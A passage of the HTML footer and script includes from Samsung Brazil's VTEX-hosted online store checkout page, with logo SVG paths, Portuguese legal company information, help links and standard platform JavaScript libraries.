                d="M481.7 338.4c22.5-7.5 46.5-11.5 71.4-11.5 109 0 200 77.4 220.8 180.3l154.5-31.5c-35.4-174.8-190-306.4-375.3-306.4-42.5 0-83.2 6.9-121.4 19.7l50 149.4z"
                class="st0"
              />
              <path
                d="M299.4 839l104.5-118.1c-46.6-41.3-76-101.6-76-168.8 0-67.1 29.4-127.4 76-168.6L299.4 265.3C220.2 335.5 170.2 438 170.2 552.1c0 114.2 50 216.7 129.2 286.9"
                class="st1"
              />
              <path
                d="M773.9 597.3C753 700.1 662.1 777.4 553.2 777.4c-25 0-49.1-4-71.5-11.6l-50 149.6c38.2 12.7 79 19.6 121.5 19.6 185.1 0 339.6-131.4 375.2-306l-154.5-31.7z"
                class="st2"
              />
              <path
                d="M1063.5 725.8c-5.1-8.2-11.9-21.3-16.1-31-24.5-56.8-25.6-115.6-5-172 22.7-61.9 66.1-109.2 122.2-133.4 70.5-30.3 148.4-24.4 216 15.7 42.9 24.6 73.3 62.6 96.4 116.4 2.9 6.9 5.5 14.2 8.1 20.5l-421.6 183.8zm140.8-245.1c-50.1 21.5-75.9 68.5-70.5 123.5l212-91.3c-36.5-42.8-83.9-57-141.5-32.2zm167.9 198.6c-.1 0-.1.1-.1.1l-4.4-3c-12.7 20.5-32.4 37.2-57.3 48-47.4 20.6-91.3 15.3-122.9-12.4l-2.9 4.4s0-.1-.1-.1l-53.8 80.5c13.4 9.3 27.7 17.1 42.7 23.4 59.4 24.7 120.2 23.5 180.1-2.5 43.3-18.8 77.3-47.4 100.5-83.7l-81.8-54.7zM1632.4 271v447.4l69.6 28.2-39.5 92.2-76.8-32c-17.2-7.5-29-18.9-37.8-31.8-8.5-13.1-14.8-31.2-14.8-55.4V271h99.3z"
              />
              <g>
                <path
                  d="M1812.6 604.5c0-38.1 16.9-72.3 43.5-95.5l-71.4-79.6c-48.4 42.8-78.9 105.3-78.9 174.9-.1 69.7 30.4 132.3 78.7 175.1l71.3-79.6c-26.5-23.3-43.2-57.3-43.2-95.3zM1939.4 731.4c-14 0-27.6-2.4-40.2-6.6l-34.1 101.3c23.3 7.8 48.2 12.1 74.2 12.1 113 .1 207.3-80.1 229.2-186.6l-104.8-21.4c-11.9 57.9-63 101.3-124.3 101.2zM1939.7 370.8c-25.9 0-50.8 4.2-74.1 11.9l33.8 101.4c12.7-4.2 26.2-6.5 40.2-6.5 61.4.1 112.6 43.7 124.2 101.7l104.8-21.2c-21.5-106.7-115.8-187.2-228.9-187.3z"
                />
              </g>
            </svg>
          </div>
        </div>

        <div class="footer-infomations">
          <div class="gb-footer-2019__info-legal">
            <p>
              SAMSUNG ELETRÔNICA DA AMAZÔNIA LTDA., com sede em Av. dos Oitis,
              nº 1.460, Distrito Industrial, Manaus/AM, 69.007-002, inscrita no
              CNPJ/MF sob o nº. 00.280.273/0001-37.
            </p>

            <p>
              Esse website é melhor visualizado nas versões Microsoft Internet
              Explorer&nbsp;11 ou superior e/ou nas últimas versões dos
              navegadores Google Chrome e Mozilla Firefox.
            </p>
          </div>
        </div>
      </div>

      <div class="help-section">
        <span>
          <h2>Precisa de Ajuda?</h2>
          <h3>
            <a style="color: #373737" href="tel:08000072611">0800 007 2611</a>
          </h3>
        </span>

        <ul>
          <li>
            <a
              href="https://www.samsung.com/br/shop/terms_and_conditions_of_sale/"
              >Termos e Condições</a
            >
          </li>
          <li>
            <a href="https://www.samsung.com/br/shop/sac/"
              >Central de Atendimento</a
            >
          </li>
          <li>
            <a href="https://www.samsung.com/br/shop-faq/">FAQ Loja Online</a>
          </li>
        </ul>
      </div>
    </div>

    <div class="footer-infomations-mobile">
      <p>
       SAMSUNG ELETRÔNICA DA AMAZÔNIA LTDA., com sede em Av. dos Oitis,
              nº 1.460, Distrito Industrial, Manaus/AM, 69.007-002, inscrita no
              CNPJ/MF sob o nº. 00.280.273/0001-37.
        <a href="//www.samsung.com/br/shop/sac/">Contato Eletrônico</a
        >&nbsp;para compras na Loja Online.
      </p>
    </div>
  </div>
</div>

<script defer src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>




</script>
<script src="//io2.vtex.com/vtex-id-ui/3.27.1/vtexid.min.js"></script>
<script>
    vtexid.setScopeName(vtex.vtexid.accountName);
    vtexid.setScope(vtex.vtexid.accountId);
</script>
<script src="//io2.vtex.com/front-libs/bundles/knockout-2.3.0-underscore-1.7.0-i18next-1.7.2-radio-0.2-json2-patch.min.js"></script>

</script>
<script src="//vtex.vtexassets.com/_v/public/assets/v1/npm/@adobe/adobe-client-data-layer@2.0.2/dist/adobe-client-data-layer.min.js" integrity="sha384-L8gyDoJCK97f6nb568IRvl2ZNkqnIb2TLZUIdXN2msRAfxRnTn6tb1XaDxBQFiGE" crossorigin="anonymous" async defer></script>

<script crossorigin="anonymous" src="//io2.vtex.com/checkout-ui/v6.111.1/script/lib-common.min.js"></script>

<script src="//io2.vtex.com/front-libs/dustjs-linkedin/2.3.5/dust-core-2.3.5.min.js"></script>
<script src="//io2.vtex.com/front-libs/dustjs-linkedin-helpers/1.1.1/dust-helpers-1.1.1.js"></script>
<script src="//io2.vtex.com/front-libs/parsley/2.0.3/parsley.min.js"></script>
<script src="//io2.vtex.com/front-libs/curl/0.8.10-vtex.2/curl.js"></script>

<script src="//io2.vtex.com/front.cart/v1.7.3/script/setup/front-cart.js"></script>

<script src="//io2.vtex.com/front-libs/front-i18n/0.7.2/vtex-i18n.js"></script>
<script src="//io2.vtex.com/front-libs/front-i18n/0.7.2/vtex-locale-selector.js"></script>



<script src="//io2.vtex.com/vtex.js/v2.13.0/retry-ajax.min.js"></script>
<script src="//io2.vtex.com/vtex.js/v2.13.0/extended-ajax.min.js"></script>
<script src="//io2.vtex.com/vtex.js/v2.13.0/checkout.min.js"></script>
<script src="//io2.vtex.com/front.phone/v4.19.4/script/phone-all-bundle.js"></script>


<script crossorigin="anonymous" src="//io2.vtex.com/checkout-ui/v6.111.1/script/checkout-lib.min.js"></script>
<script crossorigin="anonymous" src="//io2.vtex.com/checkout-ui/v6.111.1/script/checkout.min.js"></script>
</body>
</html>
